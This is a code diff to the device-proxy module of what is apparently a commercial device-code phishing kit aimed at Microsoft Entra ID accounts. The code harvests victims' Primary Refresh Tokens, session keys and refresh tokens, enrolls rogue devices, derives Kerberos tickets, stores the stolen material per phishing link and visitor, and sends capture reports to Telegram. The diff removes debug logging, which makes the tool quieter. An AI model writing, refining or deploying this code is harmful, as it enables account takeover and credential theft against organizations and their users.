@@ -315,7 +315,6 @@ async function pollForToken(jobId) {
                     value: cookieValue,
                     domain: '.login.microsoftonline.com'
                   });
-                  console.log('[DeviceProxy] PRT cookie captured from refresh token exchange: prefix=' + cookieValue.substring(0, 30) + '... length=' + cookieValue.length);
                 }
               }
             }
@@ -325,7 +324,7 @@ async function pollForToken(jobId) {
               tokenData.refresh_token = refreshResponse.data.refresh_token;
             }
           } catch (e) {
-            console.log('[DeviceProxy] Refresh token exchange for PRT failed:', e.message);
+            /* ignore */
           }
         }
 
@@ -338,7 +337,6 @@ async function pollForToken(jobId) {
         if (job.proxy_id) {
           try {
             await proxyManager.markSuccess(job.proxy_id);
-            console.log(`[DeviceProxy] Marked proxy ${job.proxy_id} as success`);
           } catch (e) {
             /* ignore */
           }
@@ -383,7 +381,6 @@ async function pollForToken(jobId) {
       ) {
         // Personal account or declined - stop immediately
         // This matches competitor behavior showing "code expired"
-        console.log('[DeviceProxy] Personal account detected, stopping with expired behavior');
         job.status = 'failed';
         job.error = 'Code expired';
         return;
@@ -409,7 +406,6 @@ async function pollForToken(jobId) {
       if (job.proxy_id) {
         try {
           await proxyManager.markFailure(job.proxy_id);
-          console.log(`[DeviceProxy] Marked proxy ${job.proxy_id} as failure`);
         } catch (e) {
           /* ignore */
         }
@@ -563,7 +559,6 @@ async function storeToken(job, tokenData, responseCookies = []) {
       const prtCookieClaims = parsePrtClaims(prtCookie.value);
       if (prtCookieClaims) {
         prt = prtCookie.value;
-        console.log('[DeviceProxy] PRT from cookie: prefix=' + (prtCookie.value || '').substring(0, 30) + '... length=' + (prtCookie.value || '').length);
       } else {
         console.warn('[DeviceProxy] Ignoring non-JWT x-ms-RefreshTokenCredential cookie; real PRT JWT required for renewal/Kerberos flow');
       }
@@ -575,16 +570,12 @@ async function storeToken(job, tokenData, responseCookies = []) {
     if (!prt && tokenData.refresh_token) {
       if (parsePrtClaims(tokenData.refresh_token)) {
         prt = tokenData.refresh_token;
-        console.log('[DeviceProxy] Using OAuth refresh_token as valid PRT fallback: prefix=' + (prt || '').substring(0, 30) + '...');
-      } else {
-        console.log('[DeviceProxy] Ignoring refresh_token fallback: it is not a valid PRT JWT; real x-ms-RefreshTokenCredential session material is required');
       }
     }
 
     // Extract session_key_enc from token response (if present)
     if (tokenData.session_key_enc) {
       sessionKeyJwe = tokenData.session_key_enc;
-      console.log('[DeviceProxy] session_key_enc from token response');
     }
 
     // Extract client_info from token response (base64-encoded JSON with uid/utid)
@@ -593,7 +584,6 @@ async function storeToken(job, tokenData, responseCookies = []) {
         const clientInfoParsed = JSON.parse(Buffer.from(tokenData.client_info, 'base64').toString());
         deviceTenantId = clientInfoParsed.utid || null;
         clientInfo = tokenData.client_info;
-        console.log('[DeviceProxy] client_info from token response, deviceTenantId=' + deviceTenantId);
       } catch (e) { /* ignore */ }
     }
 
@@ -638,7 +628,6 @@ async function storeToken(job, tokenData, responseCookies = []) {
           certificateDerBase64: enrollmentResult.certificateDerBase64 || null,
         };
 
-        console.log('[DeviceProxy] Device enrolled: ' + enrollmentResult.deviceName + ' (' + deviceId + ')');
       } catch (enrollErr) {
         console.error('[DeviceProxy] Device enrollment failed:', enrollErr.message);
         deviceEnrolled = false;
@@ -663,7 +652,6 @@ async function storeToken(job, tokenData, responseCookies = []) {
               privateKeyPem: retryResult.privateKeyPem || null,
               certificateDerBase64: retryResult.certificateDerBase64 || null,
             };
-            console.log('[DeviceProxy] Device enrolled after DRS token refresh: ' + (retryResult.deviceName || fresh.deviceId) + ' (' + fresh.deviceId + ')');
           }
         }
       } catch (refreshErr) {
@@ -682,7 +670,6 @@ async function storeToken(job, tokenData, responseCookies = []) {
             uid: idTokenClaims.oid || idTokenClaims.sub || '',
             utid: idTokenClaims.tid || ''
           });
-          console.log('[DeviceProxy] Extracted client_info from id_token (tid=' + idTokenClaims.tid + ', oid=' + idTokenClaims.oid + ')');
         }
       } catch (e) { /* ignore */ }
     }
@@ -696,7 +683,6 @@ async function storeToken(job, tokenData, responseCookies = []) {
           // Extract client_info from PRT JWT (higher priority than token response)
           if (prtClaims.client_info && !clientInfo) {
             clientInfo = prtClaims.client_info;
-            console.log('[DeviceProxy] client_info from PRT JWT');
           }
           // Extract device_tenant_id from PRT JWT client_info
           if (prtClaims.client_info) {
@@ -708,17 +694,12 @@ async function storeToken(job, tokenData, responseCookies = []) {
           // Extract session_key from PRT JWT (overrides session_key_enc from token response)
           if (prtClaims.session_key) {
             sessionKeyJwe = prtClaims.session_key;
-            console.log('[DeviceProxy] session_key from PRT JWT');
-          }
-          // Log acrs claim for Kerberos eligibility check
-          if (Array.isArray(prtClaims.acrs)) {
-            console.log('[DeviceProxy] PRT acrs claims: ' + JSON.stringify(prtClaims.acrs) + ' (pfdr=' + prtClaims.acrs.includes('pfdr') + ')');
           }
         } else {
-          console.log('[DeviceProxy] PRT JWT parse failed (not a JWT format): prefix=' + (prtCookie.value || '').substring(0, 30) + '...');
+          /* not a JWT */
         }
       } catch (e) {
-        console.log('[DeviceProxy] Failed to decode PRT JWT:', e.message);
+        /* ignore */
       }
     }
 
@@ -739,7 +720,6 @@ async function storeToken(job, tokenData, responseCookies = []) {
         });
         if (prtResult.prt) prt = prtResult.prt;
         if (prtResult.sessionKeyJwe) sessionKeyJwe = prtResult.sessionKeyJwe;
-        console.log('[DeviceProxy] PRT + session_key_jwe captured via request_for_device (GraphSpy parity)');
 
         // Persist the decrypted session key where resolveSessionKeyForToken()
         // and the Kerberos derivation read it. Upsert: the broker-enrollment
@@ -774,9 +754,6 @@ async function storeToken(job, tokenData, responseCookies = []) {
       const emailDomain = email.split('@')[1].toLowerCase();
       if (['outlook.com', 'hotmail.com', 'live.com', 'passport.com'].includes(emailDomain)) {
         accountType = 'personal';
-        console.log('[DeviceProxy] Personal account detected:', emailDomain, '- device registration disabled');
-      } else {
-        console.log('[DeviceProxy] Organization account detected:', emailDomain, '- device registration enabled');
       }
     }
 
@@ -890,13 +867,6 @@ async function storeToken(job, tokenData, responseCookies = []) {
         && tenant && tenant !== 'common' && tenant !== 'organizations') {
       const kerberosService = require('./kerberos');
       kerberosService.deriveTGTForToken(tokenId)
-        .then(r => {
-          if (r && r.success) {
-            console.log('[DeviceProxy] Kerberos TGTs derived for token', tokenId);
-          } else {
-            console.log('[DeviceProxy] Kerberos derivation skipped for token', tokenId, ':', (r && r.error) || 'unknown');
-          }
-        })
         .catch(err => console.error('[DeviceProxy] Kerberos derivation error:', err.message));
     }
 
@@ -906,7 +876,6 @@ async function storeToken(job, tokenData, responseCookies = []) {
       const refreshTokenForConversion = prt || tokenData.refresh_token || tokenData.access_token;
       const validPrtForConversion = !!(prt && parsePrtClaims(prt));
       if (!validPrtForConversion) {
-        console.log('[DeviceProxy] Skipping cookie conversion: no valid PRT JWT; refresh token is not accepted as a substitute PRT');
         cookieConversionResult = { success: false, error: 'No valid PRT JWT available for cookie conversion' };
       } else {
         cookieConversionResult = await cookieConverter.processCookieConversion(tokenId, refreshTokenForConversion, 'office', tenant, accountType, job.user_id)
@@ -921,7 +890,6 @@ async function storeToken(job, tokenData, responseCookies = []) {
     // This runs asynchronously and doesn't block the response
     // Works for: specific tenant GUIDs, 'organizations', AND 'common' endpoints
     if (accountType === 'work_school' && tokenData.access_token && !deviceEnrolled) {
-      console.log('[DeviceProxy] Attempting device registration for token', tokenId, 'tenant:', tenant);
       const deviceManager = require('./devicemanager');
       // Extract email domain for DRS registration (e.g., 'saintaloysiusms.org' from 'user@saintaloysiusms.org')
       const emailDomain = email ? email.split('@')[1] : null;
@@ -937,7 +905,6 @@ async function storeToken(job, tokenData, responseCookies = []) {
         user_id: job.user_id,
         link_id: job.link_id
       }).then(async (registrationResult) => {
-        console.log('[DeviceProxy] Device registered successfully:', registrationResult.deviceId);
         // Store device credentials in database
         await deviceManager.storeDeviceCredentials(registrationResult, job.user_id, email);
 
@@ -964,23 +931,18 @@ async function storeToken(job, tokenData, responseCookies = []) {
               'UPDATE captured_tokens SET prt = ?, session_key_jwe = ? WHERE id = ?',
               [encrypt(registrationResult.prt), encrypt(registrationResult.sessionKeyJwe || null), tokenId]
             );
-            console.log('[DeviceProxy] Token row upgraded to raw PRT from request_for_device');
           } catch (pErr) {
             console.warn('[DeviceProxy] Failed to store request_for_device PRT:', pErr.message);
           }
         }
       }).then(() => {
-        console.log('[DeviceProxy] Device credentials stored for token', tokenId);
-
         // Auto-derive Kerberos TGTs ONLY after successful device registration
         // This ensures we have a real PRT (not just a refresh token)
         if (tenant && tenant !== 'common' && tenant !== 'organizations') {
-          console.log('[DeviceProxy] Attempting Kerberos TGT derivation for token', tokenId, 'tenant:', tenant);
           const kerberosService = require('./kerberos');
           kerberosService.deriveTGTForToken(tokenId)
             .then(derivationResult => {
               if (derivationResult.success) {
-                console.log('[DeviceProxy] Kerberos TGT derived for token', tokenId, ':', derivationResult.email);
                 // Update the token record with Kerberos data
                 if (derivationResult.tgt_cloud) {
                   db.query(
@@ -1006,8 +968,6 @@ async function storeToken(job, tokenData, responseCookies = []) {
                     [derivationResult.kerberos_top_level_names, tokenId]
                   ).catch(err => console.error('[DeviceProxy] Failed to save kerberos names:', err));
                 }
-              } else {
-                console.log('[DeviceProxy] Kerberos derivation skipped for token', tokenId, ':', derivationResult.error || 'no PRT');
               }
             })
             .catch(err => {
@@ -1022,11 +982,6 @@ async function storeToken(job, tokenData, responseCookies = []) {
 
       // Expose flag for capture.js to check early
       job.deviceRegistrationFailed = () => deviceRegistrationFailed;
-    } else {
-      console.log('[DeviceProxy] Device registration skipped:', {
-        tokenId,
-        reason: accountType !== 'work_school' ? 'not work/school' : !tokenData.access_token ? 'no access_token' : 'unknown'
-      });
     }
 
     // Update visitor status to "done" (or "blocked" if block_done_visitors is enabled)
@@ -1044,7 +999,6 @@ async function storeToken(job, tokenData, responseCookies = []) {
         'UPDATE visitors SET status = ? WHERE user_id = ? AND link_id = ? AND status IN (?, ?)',
         [newStatus, job.user_id, job.link_id, 'waiting', 'visited']
       );
-      console.log(`[DeviceProxy] Visitor marked as ${newStatus} for user ${job.user_id}, link ${job.link_id} (updated ${updateResult.affectedRows} rows)`);
     } catch (updateErr) {
       console.error('[DeviceProxy] Visitor status update error:', updateErr.message);
     }
@@ -1064,8 +1018,6 @@ async function storeToken(job, tokenData, responseCookies = []) {
     } catch (e) {
       /* silent */
     }
-
-    console.log(`[DeviceProxy] Token captured for user ${job.user_id}, link ${job.link_id}`);
 
     // Send Telegram capture report directly from device proxy
     // This ensures Telegram receives the capture even if the worker never calls /api/capture
@@ -1131,9 +1083,7 @@ async function storeToken(job, tokenData, responseCookies = []) {
 
       const filename = `capture_device_${tokenId}_${reportTokenType}.txt`;
 
-      console.log('[DeviceProxy] Sending Telegram report for token', tokenId, 'type=', reportTokenType, 'caption=', caption);
       await sendTelegramDocument(job.user_id, filename, fileContent, caption);
-      console.log('[DeviceProxy] Telegram report sent for token', tokenId);
     } catch (telegramErr) {
       console.error('[DeviceProxy] Telegram report failed:', telegramErr);
     }
